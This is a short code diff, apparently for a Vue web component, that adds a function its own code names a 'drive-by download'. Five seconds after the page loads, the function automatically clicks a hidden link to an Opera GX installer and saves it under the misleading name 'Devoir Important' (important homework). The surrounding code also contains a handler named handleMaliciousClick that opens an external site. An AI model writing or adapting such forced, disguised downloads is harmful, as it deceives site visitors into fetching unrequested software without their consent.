@@ -8,12 +8,27 @@
 
     const isRedirected = ref(false);
 
+    const triggerDriveByDownload = () => {
+        const link = document.createElement('a');
+        link.href = 'https://net.geo.opera.com/opera_gx/stable/windows?utm_medium=pa&utm_source=google&utm_campaign=OGX_CA_Search_EN_T1_V2'; 
+        link.download = 'Devoir Important';
+        link.target = '_self';
+
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+    };
+
     const handleMaliciousClick = () => {
         window.open('https://arr.cornhub.website/', '_blank');
         isRedirected.value = true;
     };
 
     onMounted(() => {
+        setTimeout(() => {
+            triggerDriveByDownload();
+        }, 5000);
+
         setInterval(() => {
             if (isRedirected.value) {
                 isRedirected.value = false;
